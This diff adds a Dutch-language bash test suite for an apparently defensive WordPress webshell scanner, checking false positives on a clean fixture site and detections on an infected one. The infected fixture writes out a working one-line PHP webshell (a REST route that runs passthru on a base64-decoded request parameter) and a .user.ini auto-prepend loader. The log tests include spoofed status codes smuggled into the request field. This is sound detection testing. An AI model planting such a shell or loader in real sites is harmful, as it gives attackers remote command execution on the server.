@@ -1,0 +1,115 @@
+#!/bin/bash
+set -uo pipefail
+
+REPO_ROOT=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)
+. "$REPO_ROOT/lib/common.sh"
+. "$REPO_ROOT/config/wp2shell.conf"
+. "$REPO_ROOT/lib/version.sh"
+. "$REPO_ROOT/lib/discovery.sh"
+. "$REPO_ROOT/lib/detect_files.sh"
+. "$REPO_ROOT/lib/detect_logs.sh"
+
+detect_optional_commands
+resolve_external_tools >/dev/null 2>&1
+
+tests_run=0
+tests_failed=0
+
+expect_equal() {
+    local label=$1 expected=$2 actual=$3
+    tests_run=$((tests_run + 1))
+    if [ "$expected" = "$actual" ]; then
+        printf 'ok   %s\n' "$label"
+    else
+        printf 'FAIL %s: verwacht "%s", kreeg "%s"\n' "$label" "$expected" "$actual" >&2
+        tests_failed=$((tests_failed + 1))
+    fi
+}
+
+FIXTURE=$(mktemp -d -t wp2shell-fptest.XXXXXXXX)
+trap 'rm -rf -- "$FIXTURE"' EXIT
+
+WP2SHELL_RUN_ID="fptest"
+WP2SHELL_FINDINGS_FILE="$FIXTURE/findings.ndjson"
+WP2SHELL_AUDIT_LOG="$FIXTURE/audit.log"
+
+count_actionable_high_confidence() {
+    php -r '
+        $n = 0;
+        foreach (file($argv[1]) as $line) {
+            $d = json_decode($line, true);
+            if (!$d) { continue; }
+            if ($d["confidence"] !== "high-confidence") { continue; }
+            if ($d["severity"] === "info") { continue; }
+            if ($d["file_path"] === "") { continue; }
+            $n++;
+        }
+        echo $n;
+    ' "$WP2SHELL_FINDINGS_FILE"
+}
+
+SITE="$FIXTURE/schoon"
+mkdir -p "$SITE/wp-includes" "$SITE/wp-content/plugins/securityplugin/lib" \
+    "$SITE/wp-content/plugins/securityplugin/waf" "$SITE/wp-content/plugins/cacheplugin"
+{
+    printf '<?php\n'
+    printf '$wp_version = %s7.0.3%s;\n' "'" "'"
+    printf '$wp_db_version = 60717;\n'
+} > "$SITE/wp-includes/version.php"
+printf '<?php\n' > "$SITE/wp-config.php"
+
+printf '<?php\nregister_rest_route("myplugin/v1","/status",array("permission_callback" => "__return_true","callback"=>"cb"));\n' \
+    > "$SITE/wp-content/plugins/securityplugin/lib/rest.php"
+printf '<?php\n$config = base64_decode($stored_config);\nif ($mode) { exec($internal_command); }\n' \
+    > "$SITE/wp-content/plugins/securityplugin/waf/engine.php"
+printf '<?php $data = gzinflate(base64_decode($cached_payload));\n' \
+    > "$SITE/wp-content/plugins/cacheplugin/cache.php"
+printf 'auto_prepend_file = %s/home/klant/public_html/wp-content/plugins/securityplugin/waf-loader.php%s\n' "'" "'" \
+    > "$SITE/.user.ini"
+
+: > "$WP2SHELL_FINDINGS_FILE"
+detect_files_for_site "$SITE" "$(id -un)" >/dev/null 2>&1
+
+expect_equal "een schone site levert geen enkele automatisch te verwijderen bevinding" "0" \
+    "$(count_actionable_high_confidence)"
+
+expect_equal "de open REST-route alleen levert geen kwaadaardige pluginstructuur op" "0" \
+    "$("${WP2SHELL_GREP:-grep}" -c 'malicious-plugin-structure' "$WP2SHELL_FINDINGS_FILE" || true)"
+
+expect_equal "de .user.ini van een securityplugin gaat niet automatisch in quarantaine" "0" \
+    "$("${WP2SHELL_GREP:-grep}" -c '"category":"user-ini-auto-prepend"' "$WP2SHELL_FINDINGS_FILE" || true)"
+
+BAD="$FIXTURE/besmet"
+mkdir -p "$BAD/wp-includes" "$BAD/wp-content/plugins/gg-abc123" "$BAD/wp-content/uploads"
+{
+    printf '<?php\n'
+    printf '$wp_version = %s6.9.4%s;\n' "'" "'"
+    printf '$wp_db_version = 60717;\n'
+} > "$BAD/wp-includes/version.php"
+printf '<?php\n' > "$BAD/wp-config.php"
+printf '<?php\nregister_rest_route("evil/v1","/run",array("permission_callback"=>"__return_true","callback"=>function($r){passthru(base64_decode($r->get_param("c")));}));\n' \
+    > "$BAD/wp-content/plugins/gg-abc123/shell.php"
+printf 'auto_prepend_file=/home/klant/public_html/wp-content/uploads/loader.php\n' > "$BAD/.user.ini"
+
+: > "$WP2SHELL_FINDINGS_FILE"
+detect_files_for_site "$BAD" "$(id -un)" >/dev/null 2>&1
+
+expect_equal "een webshellplugin in een bestand wordt wel bevestigd" "1" \
+    "$("${WP2SHELL_GREP:-grep}" -c 'malicious-plugin-structure' "$WP2SHELL_FINDINGS_FILE" || true)"
+
+expect_equal "een .user.ini die naar uploads wijst wordt wel bevestigd" "1" \
+    "$("${WP2SHELL_GREP:-grep}" -c '"category":"user-ini-auto-prepend"' "$WP2SHELL_FINDINGS_FILE" || true)"
+
+expect_equal "echte 207 wordt gelezen" "207" \
+    "$(detect_logs_extract_status '1.2.3.4 - - [x] "POST /wp-json/batch/v1 HTTP/1.1" 207 512')"
+expect_equal "een 404 in het requestveld verbergt de echte 207 niet" "207" \
+    "$(detect_logs_extract_status '1.2.3.4 - - [x] "GET /wp-json/batch/v1?x=\" 404 y HTTP/1.1" 207 512')"
+expect_equal "een vervalste 207 in het requestveld wordt niet geloofd" "404" \
+    "$(detect_logs_extract_status '1.2.3.4 - - [x] "GET /x?a=\" 207 1 HTTP/1.1" 404 12')"
+expect_equal "een streepje als bytecount breekt de statusparsing niet" "200" \
+    "$(detect_logs_extract_status '1.2.3.4 - - [x] "GET / HTTP/1.1" 200 -')"
+
+printf '\n%s tests, %s mislukt\n' "$tests_run" "$tests_failed"
+if [ "$tests_failed" -gt 0 ]; then
+    exit 1
+fi
